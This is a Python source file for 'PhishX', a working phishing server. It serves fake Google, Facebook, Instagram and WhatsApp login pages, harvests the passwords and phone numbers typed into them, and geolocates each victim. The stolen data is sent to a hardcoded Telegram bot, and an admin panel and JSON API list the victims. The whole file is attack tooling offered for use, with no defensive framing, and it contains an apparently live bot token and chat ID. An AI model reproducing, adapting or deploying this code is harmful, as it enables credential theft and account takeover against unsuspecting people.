#!/usr/bin/env python3
"""
PHISHX - Advanced Phishing Tool
Author: Zorro
Version: 2.0
"""

import os
import sys
import json
import time
import socket
import requests
import threading
from flask import Flask, request, render_template, redirect, jsonify
from telegram import Bot
from telegram.error import TelegramError
import logging
from datetime import datetime

# Configuration
CONFIG = {
    "telegram_token": "8369349584:AAH6k0s0auAQZpiVwEVYnmRjmv2esMEDZYg",
    "telegram_chat_id": "8092646327",
    "port": 8080,
    "host": "0.0.0.0",
    "debug": False,
    "templates": {
        "google": "Google Login",
        "facebook": "Facebook Login",
        "instagram": "Instagram Login",
        "twitter": "Twitter Login",
        "github": "GitHub Login",
        "netflix": "Netflix Login",
        "paypal": "PayPal Login",
        "whatsapp": "WhatsApp Verification",
        "custom": "Custom Page"
    }
}

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('phishx.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class PhishX:
    def __init__(self):
        self.app = Flask(__name__, template_folder='templates', static_folder='static')
        self.bot = Bot(token=CONFIG['telegram_token'])
        self.victims = []
        self.setup_routes()
        
    def get_victim_info(self):
        """Collect comprehensive victim information"""
        try:
            # Get IP address
            if request.headers.get('X-Forwarded-For'):
                ip = request.headers.get('X-Forwarded-For').split(',')[0]
            else:
                ip = request.remote_addr
            
            # Get geolocation
            location = self.get_geolocation(ip)
            
            # Get device info
            user_agent = request.headers.get('User-Agent', 'Unknown')
            
            # Parse User-Agent
            device_info = self.parse_user_agent(user_agent)
            
            # Additional headers
            headers = dict(request.headers)
            
            victim_data = {
                'ip': ip,
                'location': location,
                'user_agent': user_agent,
                'device_info': device_info,
                'headers': headers,
                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'url': request.url,
                'method': request.method
            }
            
            return victim_data
        except Exception as e:
            logger.error(f"Error getting victim info: {e}")
            return {}
    
    def get_geolocation(self, ip):
        """Get geolocation from IP address"""
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,as,query')
            data = response.json()
            
            if data.get('status') == 'success':
                return {
                    'country': data.get('country', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'latitude': data.get('lat'),
                    'longitude': data.get('lon'),
                    'isp': data.get('isp', 'Unknown'),
                    'organization': data.get('org', 'Unknown'),
                    'asn': data.get('as', 'Unknown')
                }
        except:
            pass
        return {'country': 'Unknown', 'city': 'Unknown'}
    
    def parse_user_agent(self, user_agent):
        """Parse User-Agent string for device info"""
        info = {
            'browser': 'Unknown',
            'os': 'Unknown',
            'device': 'Unknown',
            'platform': 'Unknown'
        }
        
        # Simple parsing (you can add more sophisticated parsing)
        ua_lower = user_agent.lower()
        
        # Browser detection
        if 'chrome' in ua_lower:
            info['browser'] = 'Chrome'
        elif 'firefox' in ua_lower:
            info['browser'] = 'Firefox'
        elif 'safari' in ua_lower:
            info['browser'] = 'Safari'
        elif 'edge' in ua_lower:
            info['browser'] = 'Edge'
        elif 'opera' in ua_lower:
            info['browser'] = 'Opera'
        
        # OS detection
        if 'windows' in ua_lower:
            info['os'] = 'Windows'
        elif 'android' in ua_lower:
            info['os'] = 'Android'
        elif 'iphone' in ua_lower or 'ipad' in ua_lower:
            info['os'] = 'iOS'
        elif 'mac os' in ua_lower:
            info['os'] = 'macOS'
        elif 'linux' in ua_lower:
            info['os'] = 'Linux'
        
        # Device type
        if 'mobile' in ua_lower:
            info['device'] = 'Mobile'
        elif 'tablet' in ua_lower:
            info['device'] = 'Tablet'
        else:
            info['device'] = 'Desktop'
        
        return info
    
    def send_to_telegram(self, message, credentials=None, victim_info=None):
        """Send captured data to Telegram"""
        try:
            # Format message
            formatted_message = self.format_message(message, credentials, victim_info)
            
            # Send to Telegram
            self.bot.send_message(
                chat_id=CONFIG['telegram_chat_id'],
                text=formatted_message,
                parse_mode='HTML'
            )
            
            # Send location if available
            if victim_info and victim_info.get('location') and victim_info['location'].get('latitude'):
                try:
                    self.bot.send_location(
                        chat_id=CONFIG['telegram_chat_id'],
                        latitude=victim_info['location']['latitude'],
                        longitude=victim_info['location']['longitude']
                    )
                except:
                    pass
            
            logger.info(f"Data sent to Telegram: {credentials}")
            return True
        except TelegramError as e:
            logger.error(f"Telegram error: {e}")
            return False
        except Exception as e:
            logger.error(f"Error sending to Telegram: {e}")
            return False
    
    def format_message(self, page, credentials, victim_info):
        """Format message for Telegram"""
        message = f"""
🚨 <b>PHISHING CAPTURE ALERT!</b> 🚨

📄 <b>Page:</b> {page}
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

👤 <b>VICTIM CREDENTIALS:</b>
"""
        
        if credentials:
            for key, value in credentials.items():
                message += f"🔑 <b>{key}:</b> <code>{value}</code>\n"
        
        if victim_info:
            message += f"""
🌐 <b>VICTIM INFORMATION:</b>
📍 <b>IP:</b> <code>{victim_info.get('ip', 'Unknown')}</code>
🗺️ <b>Location:</b> {victim_info.get('location', {}).get('city', 'Unknown')}, {victim_info.get('location', {}).get('country', 'Unknown')}
📱 <b>Device:</b> {victim_info.get('device_info', {}).get('device', 'Unknown')} ({victim_info.get('device_info', {}).get('os', 'Unknown')})
🌍 <b>Browser:</b> {victim_info.get('device_info', {}).get('browser', 'Unknown')}
"""
        
        message += f"""
🔗 <b>URL:</b> {victim_info.get('url', 'Unknown') if victim_info else 'Unknown'}
📊 <b>Total Victims:</b> {len(self.victims)}

⚠️ <i>This is an automated alert from GCS PhishX</i>
"""
        return message
    
    def setup_routes(self):
        """Setup Flask routes for different phishing pages"""
        
        @self.app.route('/')
        def index():
            return render_template('index.html', templates=CONFIG['templates'])
        
        @self.app.route('/google', methods=['GET', 'POST'])
        def google_phish():
            if request.method == 'POST':
                email = request.form.get('email', '')
                password = request.form.get('password', '')
                
                victim_info = self.get_victim_info()
                self.victims.append({
                    'page': 'Google',
                    'credentials': {'Email': email, 'Password': password},
                    'info': victim_info,
                    'time': datetime.now()
                })
                
                self.send_to_telegram(
                    'Google Login',
                    {'Email': email, 'Password': password},
                    victim_info
                )
                
                # Redirect to real Google
                return redirect('https://accounts.google.com')
            
            return render_template('google.html')
        
        @self.app.route('/facebook', methods=['GET', 'POST'])
        def facebook_phish():
            if request.method == 'POST':
                email = request.form.get('email', '')
                password = request.form.get('pass', '')
                
                victim_info = self.get_victim_info()
                self.victims.append({
                    'page': 'Facebook',
                    'credentials': {'Email': email, 'Password': password},
                    'info': victim_info,
                    'time': datetime.now()
                })
                
                self.send_to_telegram(
                    'Facebook Login',
                    {'Email': email, 'Password': password},
                    victim_info
                )
                
                return redirect('https://facebook.com')
            
            return render_template('facebook.html')
        
        @self.app.route('/instagram', methods=['GET', 'POST'])
        def instagram_phish():
            if request.method == 'POST':
                username = request.form.get('username', '')
                password = request.form.get('password', '')
                
                victim_info = self.get_victim_info()
                self.victims.append({
                    'page': 'Instagram',
                    'credentials': {'Username': username, 'Password': password},
                    'info': victim_info,
                    'time': datetime.now()
                })
                
                self.send_to_telegram(
                    'Instagram Login',
                    {'Username': username, 'Password': password},
                    victim_info
                )
                
                return redirect('https://instagram.com')
            
            return render_template('instagram.html')
        
        @self.app.route('/whatsapp', methods=['GET', 'POST'])
        def whatsapp_phish():
            if request.method == 'POST':
                phone = request.form.get('phone', '')
                
                victim_info = self.get_victim_info()
                self.victims.append({
                    'page': 'WhatsApp',
                    'credentials': {'Phone Number': phone},
                    'info': victim_info,
                    'time': datetime.now()
                })
                
                self.send_to_telegram(
                    'WhatsApp Verification',
                    {'Phone Number': phone},
                    victim_info
                )
                
                return redirect('https://web.whatsapp.com')
            
            return render_template('whatsapp.html')
        
        @self.app.route('/admin')
        def admin_panel():
            stats = {
                'total_victims': len(self.victims),
                'google_victims': len([v for v in self.victims if v['page'] == 'Google']),
                'facebook_victims': len([v for v in self.victims if v['page'] == 'Facebook']),
                'instagram_victims': len([v for v in self.victims if v['page'] == 'Instagram']),
                'whatsapp_victims': len([v for v in self.victims if v['page'] == 'WhatsApp'])
            }
            
            return render_template('admin.html', 
                                 victims=self.victims[-20:],  # Last 20 victims
                                 stats=stats)
        
        @self.app.route('/api/victims')
        def get_victims():
            return jsonify(self.victims)
        
        @self.app.route('/api/stats')
        def get_stats():
            stats = {
                'total': len(self.victims),
                'by_page': {},
                'by_hour': {},
                'recent': [{
                    'page': v['page'],
                    'time': v['time'].strftime('%H:%M:%S'),
                    'ip': v['info'].get('ip', 'Unknown')
                } for v in self.victims[-10:]]
            }
            
            for victim in self.victims:
                page = victim['page']
                stats['by_page'][page] = stats['by_page'].get(page, 0) + 1
            
            return jsonify(stats)
    
    def run(self):
        """Run the phishing server"""
        print("\n" + "="*50)
        print("🔥 GCS PHISHX - Advanced Phishing Tool 🔥")
        print("="*50)
        print(f"📡 Server: http://localhost:{CONFIG['port']}")
        print(f"📊 Admin Panel: http://localhost:{CONFIG['port']}/admin")
        print(f"🤖 Telegram Bot: @{self.bot.get_me().username}")
        print("="*50)
        print("\nAvailable Phishing Pages:")
        for page, name in CONFIG['templates'].items():
            print(f"  • http://localhost:{CONFIG['port']}/{page} - {name}")
        print("\nPress Ctrl+C to stop the server")
        print("="*50 + "\n")
        
        self.app.run(
            host=CONFIG['host'],
            port=CONFIG['port'],
            debug=CONFIG['debug'],
            threaded=True
        )

def main():
    """Main function"""
    print("Initializing PhishX...")
    
    # Check dependencies
    try:
        import flask
        import requests
        from telegram import Bot
    except ImportError as e:
        print(f"Missing dependency: {e}")
        print("Installing dependencies...")
        os.system("pip install flask requests python-telegram-bot")
        print("Dependencies installed. Please run again.")
        return
    
    # Create necessary directories
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    
    # Create templates if they don't exist
    create_templates()
    
    # Run the tool
    phishx = PhishX()
    phishx.run()

def create_templates():
    """Create HTML templates for phishing pages"""
    
    # Create index.html
    index_html = '''<!DOCTYPE html>
<html>
<head>
    <title>PhishX - Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 30px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        .card h3 { margin-top: 0; color: #333; }
        .card a { display: block; background: #4CAF50; color: white; padding: 15px; text-decoration: none; border-radius: 5px; margin-top: 15px; }
        .card a:hover { background: #45a049; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }
        .stat-box { background: white; padding: 20px; border-radius: 10px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 PhishX Dashboard</h1>
            <p>Select a phishing page to deploy</p>
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <h3>📊 Total Pages</h3>
                <p>{{ templates|length }}</p>
            </div>
            <div class="stat-box">
                <h3>🔗 Port</h3>
                <p>8080</p>
            </div>
            <div class="stat-box">
                <h3>📡 Status</h3>
                <p style="color: green;">● Running</p>
            </div>
        </div>
        
        <div class="grid">
            {% for key, name in templates.items() %}
            <div class="card">
                <h3>{{ name }}</h3>
                <p>Click to view the phishing page</p>
                <a href="/{{ key }}" target="_blank">Open {{ name }}</a>
            </div>
            {% endfor %}
        </div>
        
        <div style="margin-top: 30px; text-align: center;">
            <a href="/admin" style="background: #2196F3; padding: 15px 30px;">Admin Panel</a>
        </div>
    </div>
</body>
</html>'''
    
    with open('templates/index.html', 'w') as f:
        f.write(index_html)
    
    # Create admin.html
    admin_html = '''<!DOCTYPE html>
<html>
<head>
    <title>PhishX - Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 30px; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: white; padding: 20px; border-radius: 10px; text-align: center; }
        .victims-table { background: white; border-radius: 10px; overflow: hidden; margin-top: 30px; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #2c3e50; color: white; padding: 15px; text-align: left; }
        td { padding: 12px 15px; border-bottom: 1px solid #eee; }
        tr:hover { background: #f9f9f9; }
        .badge { padding: 5px 10px; border-radius: 20px; font-size: 12px; }
        .badge-google { background: #4285f4; color: white; }
        .badge-facebook { background: #1877f2; color: white; }
        .badge-instagram { background: #e4405f; color: white; }
        .badge-whatsapp { background: #25d366; color: white; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 GCS PhishX Admin Panel</h1>
            <p>Real-time monitoring of captured credentials</p>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <h3>👥 Total Victims</h3>
                <h2>{{ stats.total_victims }}</h2>
            </div>
            <div class="stat-card">
                <h3>🔵 Google</h3>
                <h2>{{ stats.google_victims }}</h2>
            </div>
            <div class="stat-card">
                <h3>🔵 Facebook</h3>
                <h2>{{ stats.facebook_victims }}</h2>
            </div>
            <div class="stat-card">
                <h3>🔴 Instagram</h3>
                <h2>{{ stats.instagram_victims }}</h2>
            </div>
            <div class="stat-card">
                <h3>🟢 WhatsApp</h3>
                <h2>{{ stats.whatsapp_victims }}</h2>
            </div>
        </div>
        
        <div class="victims-table">
            <h2 style="padding: 20px; margin: 0;">Recent Victims</h2>
            <table>
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>Page</th>
                        <th>IP Address</th>
                        <th>Location</th>
                        <th>Credentials</th>
                        <th>Device</th>
                    </tr>
                </thead>
                <tbody>
                    {% for victim in victims|reverse %}
                    <tr>
                        <td>{{ victim.time.strftime('%H:%M:%S') }}</td>
                        <td>
                            <span class="badge badge-{{ victim.page.lower() }}">{{ victim.page }}</span>
                        </td>
                        <td><code>{{ victim.info.ip }}</code></td>
                        <td>{{ victim.info.location.city }}, {{ victim.info.location.country }}</td>
                        <td>
                            {% for key, value in victim.credentials.items() %}
                            <strong>{{ key }}:</strong> {{ value }}<br>
                            {% endfor %}
                        </td>
                        <td>{{ victim.info.device_info.device }} ({{ victim.info.device_info.os }})</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        
        <div style="margin-top: 30px; text-align: center;">
            <button onclick="location.reload()" style="background: #2196F3; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer;">Refresh Data</button>
            <button onclick="window.location.href='/'" style="background: #4CAF50; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; margin-left: 10px;">Back to Dashboard</button>
        </div>
    </div>
</body>
</html>'''
    
    with open('templates/admin.html', 'w') as f:
        f.write(admin_html)
    
    print("[+] Templates created successfully!")

if __name__ == "__main__":
    main()

